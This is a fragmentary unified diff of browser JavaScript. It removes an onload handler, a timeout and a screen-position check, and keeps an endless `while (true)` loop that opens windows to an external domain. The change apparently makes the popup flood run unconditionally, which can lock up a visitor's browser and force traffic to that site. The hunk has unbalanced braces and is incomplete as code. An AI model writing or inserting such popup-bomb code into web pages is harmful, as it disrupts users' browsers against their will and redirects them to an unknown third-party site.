@@ -1,6 +1,3 @@
-  myPopup.onload = function() {
-    setTimeout(function() {
-      if (myPopup.screenX === 0)
         while (true) {
           window.open("http://kplibrary.cf/")
           var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
